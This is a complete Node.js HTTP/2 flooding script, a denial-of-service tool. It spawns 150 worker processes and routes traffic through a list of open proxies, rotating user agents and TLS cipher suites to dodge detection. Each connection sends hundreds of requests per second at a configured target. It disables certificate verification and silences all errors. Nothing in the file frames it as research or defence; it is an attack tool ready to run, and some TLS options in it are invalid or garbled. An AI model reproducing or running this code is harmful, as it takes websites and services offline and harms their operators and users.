const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const UserAgent = require('user-agents');
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});

const headers = {};

function readLines(filePath) {
  return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
  return elements[randomIntn(0, elements.length)];
}

const settings = {
  target: "https://api.com",
  Rate: "300",
  threads: "150",
  proxyFile: "proxies.txt"
}

const cplist = [
  "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
];

var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var proxies = readLines(settings.proxyFile);

const parsedTarget = url.parse(settings.target);

if (cluster.isMaster) {
  for (let counter = 1; counter <= settings.threads; counter++) {
    cluster.fork();
  }
} else {
  setInterval(runFlooder)
}

class NetSocket {
  constructor() {}

  HTTP(options, callback) {
    const parsedAddr = options.address.split(":");
    const addrHost = parsedAddr[0];
    const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
    const buffer = new Buffer.from(payload);

    const connection = net.connect({
      host: options.host,
      port: options.port
    });

    connection.setTimeout(options.timeout * 10000);
    connection.setKeepAlive(true, 100000);

    connection.on("connect", () => {
      connection.write(buffer);
    });
    connection.on("data", chunk => {
      const response = chunk.toString("utf-8");
      const isAlive = response.includes("HTTP/1.1 200");

      if (isAlive === false) {
        connection.destroy();
        return callback(undefined, "error: invalid response from proxy server");
      }

      return callback(connection, undefined);
    });

    connection.on("timeout", () => {
      connection.destroy();
      return callback(undefined, "error: timeout exceeded");
    });

    connection.on("error", error => {
      connection.destroy();
      return callback(undefined, "error: " + error);
    });
  }
}

const Socker = new NetSocket();

headers[":method"] = "GET";
headers[":path"] = parsedTarget.path;
headers[":scheme"] = "https";
headers["accept"] = "/";
headers["accept-language"] = "en-US,en;q=0.9";
headers["accept-encoding"] = "gzip, deflate";
headers["cache-control"] = "no-cache";
headers["upgrade-insecure-requests"] = "1";

function runFlooder() {
  const proxyAddr = randomElement(proxies);
  const parsedProxy = proxyAddr.split(":");
  const userAgentv2 = new UserAgent();
  var useragent = userAgentv2.toString();

  headers[":authority"] = parsedTarget.host;
  headers["user-agent"] = useragent;

  const proxyOptions = {
    host: parsedProxy[0],
    port: ~~parsedProxy[1],
    address: parsedTarget.host + ":443",
    timeout: 3
  };

  Socker.HTTP(proxyOptions, (connection, error) => {
    if (error) return;

    connection.setKeepAlive(true, 100000);

    const tlsOptions = {
      ALPNProtocols: ['h2', 'http/1.1', 'h3', 'http/2 quic/43', 'http/2 quic/44', 'http/2 quic/45'],
      challengesToSolve: Infinity,
      followAllRedirects: true,
      clientTimeout: Infinity,
      clientlareMaxTimeout: Infinity,
      maxRedirects: Infinity,
      ciphers: cipper,
      servername: url.hostname,
      socket: connection,
      honorCipherOrder: true,
      echdCurve: "GREASE:X25519:x25519",
      secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
      secure: true,
      rejectUnauthorized: false,
      port: 80,
      uri: parsedTarget.host,
      servername: parsedTarget.host,
    };

    const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
    tlsConn.setKeepAlive(true, 10 * 10000);

    const client = http2.connect(parsedTarget.href, {
      protocol: "https:",
      settings: {
        headerTableSize: 65536,
        maxConcurrentStreams: 1000,
        initialWindowSize: 6291456,
        maxHeaderListSize: 262144,
        enablePush: false
      },
      maxSessionMemory: 3333,
      maxDeflateDynamicTableSize: 4294967295,
      createConnection: () => tlsConn,
      socket: connection,
    });

    client.settings({
      headerTableSize: 65536,
      maxConcurrentStreams: 1000,
      initialWindowSize: 6291456,
      maxHeaderListSize: 262144,
      enablePush: false
    });

    client.on("connect", () => {
      const IntervalAttack = setInterval(() => {
        for (let i = 0; i < settings.Rate; i++) {
          const request = client.request(headers)
            .on("response", response => {
              request.close();
              request.destroy();
              return;
            });

          request.end();
        }
      }, 1000);
    });

    client.on("close", () => {
      client.destroy();
      connection.destroy();
      return;
    });

    client.on("error", error => {
      client.destroy();
      connection.destroy();
      return;
    });
  });
}
